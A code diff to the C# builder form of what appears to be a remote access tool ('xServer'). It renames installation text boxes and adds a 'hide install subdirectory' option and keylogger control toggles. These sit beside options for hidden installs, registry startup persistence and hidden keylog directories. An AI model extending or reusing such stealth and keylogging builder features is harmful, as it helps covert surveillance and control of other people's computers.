@@ -35,10 +35,11 @@ namespace xServer.Forms
             numericUpDownDelay.Value = profile.Delay;
             txtMutex.Text = profile.Mutex;
             chkInstall.Checked = profile.InstallClient;
-            txtInstallname.Text = profile.InstallName;
+            txtInstallName.Text = profile.InstallName;
             GetInstallPath(profile.InstallPath).Checked = true;
-            txtInstallsub.Text = profile.InstallSub;
+            txtInstallSubDirectory.Text = profile.InstallSub;
             chkHide.Checked = profile.HideFile;
+            chkHideSubDirectory.Checked = profile.HideSubDirectory;
             chkStartup.Checked = profile.AddStartup;
             txtRegistryKeyName.Text = profile.RegistryName;
             chkChangeIcon.Checked = profile.ChangeIcon;
@@ -69,10 +70,11 @@ namespace xServer.Forms
             profile.Delay = (int)numericUpDownDelay.Value;
             profile.Mutex = txtMutex.Text;
             profile.InstallClient = chkInstall.Checked;
-            profile.InstallName = txtInstallname.Text;
+            profile.InstallName = txtInstallName.Text;
             profile.InstallPath = GetInstallPath();
-            profile.InstallSub = txtInstallsub.Text;
+            profile.InstallSub = txtInstallSubDirectory.Text;
             profile.HideFile = chkHide.Checked;
+            profile.HideSubDirectory = chkHideSubDirectory.Checked;
             profile.AddStartup = chkStartup.Checked;
             profile.RegistryName = txtRegistryKeyName.Text;
             profile.ChangeIcon = chkChangeIcon.Checked;
@@ -101,6 +103,7 @@ namespace xServer.Forms
             UpdateStartupControlStates();
             UpdateAssemblyControlStates();
             UpdateIconControlStates();
+            UpdateKeyloggerControlStates();
         }
 
         private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
@@ -206,6 +209,13 @@ namespace xServer.Forms
             UpdateAssemblyControlStates();
         }
 
+        private void chkKeylogger_CheckedChanged(object sender, EventArgs e)
+        {
+            HasChanged();
+
+            UpdateKeyloggerControlStates();
+        }
+
         private void btnBrowseIcon_Click(object sender, EventArgs e)
         {
             using (OpenFileDialog ofd = new OpenFileDialog())
@@ -233,7 +243,7 @@ namespace xServer.Forms
         {
             return (!string.IsNullOrWhiteSpace(txtTag.Text) && !string.IsNullOrWhiteSpace(txtMutex.Text) && // General Settings
                  _hosts.Count > 0 && !string.IsNullOrWhiteSpace(txtPassword.Text) && // Connection
-                 (!chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrWhiteSpace(txtInstallname.Text))) && // Installation
+                 (!chkInstall.Checked || (chkInstall.Checked && !string.IsNullOrWhiteSpace(txtInstallName.Text))) && // Installation
                  (!chkStartup.Checked || (chkStartup.Checked && !string.IsNullOrWhiteSpace(txtRegistryKeyName.Text)))); // Installation
         }
 
@@ -255,12 +265,13 @@ namespace xServer.Forms
             options.IconPath = txtIconPath.Text;
             options.Version = Application.ProductVersion;
             options.InstallPath = GetInstallPath();
-            options.InstallSub = txtInstallsub.Text;
-            options.InstallName = txtInstallname.Text + ".exe";
+            options.InstallSub = txtInstallSubDirectory.Text;
+            options.InstallName = txtInstallName.Text + ".exe";
             options.StartupName = txtRegistryKeyName.Text;
             options.Install = chkInstall.Checked;
             options.Startup = chkStartup.Checked;
             options.HideFile = chkHide.Checked;
+            options.HideInstallSubdirectory = chkHideSubDirectory.Checked;
             options.Keylogger = chkKeylogger.Checked;
             options.LogDirectoryName = txtLogDirectoryName.Text;
             options.HideLogDirectory = chkHideLogDirectory.Checked;
@@ -377,21 +388,21 @@ namespace xServer.Forms
                 path =
                     Path.Combine(
                         Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                            txtInstallsub.Text), txtInstallname.Text);
+                            txtInstallSubDirectory.Text), txtInstallName.Text);
             else if (rbProgramFiles.Checked)
                 path =
                     Path.Combine(
                         Path.Combine(
                             Environment.GetFolderPath(PlatformHelper.Architecture == 64
                                 ? Environment.SpecialFolder.ProgramFilesX86
-                                : Environment.SpecialFolder.ProgramFiles), txtInstallsub.Text), txtInstallname.Text);
+                                : Environment.SpecialFolder.ProgramFiles), txtInstallSubDirectory.Text), txtInstallName.Text);
             else if (rbSystem.Checked)
                 path =
                     Path.Combine(
                         Path.Combine(
                             Environment.GetFolderPath(PlatformHelper.Architecture == 64
                                 ? Environment.SpecialFolder.SystemX86
-                                : Environment.SpecialFolder.System), txtInstallsub.Text), txtInstallname.Text);
+                                : Environment.SpecialFolder.System), txtInstallSubDirectory.Text), txtInstallName.Text);
 
             this.Invoke((MethodInvoker)delegate { txtPreviewPath.Text = path + ".exe"; });
         }
@@ -444,12 +455,19 @@ namespace xServer.Forms
 
         private void UpdateInstallationControlStates()
         {
-            txtInstallname.Enabled = chkInstall.Checked;
+            txtInstallName.Enabled = chkInstall.Checked;
             rbAppdata.Enabled = chkInstall.Checked;
             rbProgramFiles.Enabled = chkInstall.Checked;
             rbSystem.Enabled = chkInstall.Checked;
-            txtInstallsub.Enabled = chkInstall.Checked;
+            txtInstallSubDirectory.Enabled = chkInstall.Checked;
             chkHide.Enabled = chkInstall.Checked;
+            chkHideSubDirectory.Enabled = chkInstall.Checked;
+        }
+
+        private void UpdateKeyloggerControlStates()
+        {
+            txtLogDirectoryName.Enabled = chkKeylogger.Checked;
+            chkHideLogDirectory.Enabled = chkKeylogger.Checked;
         }
 
         private void HasChanged()
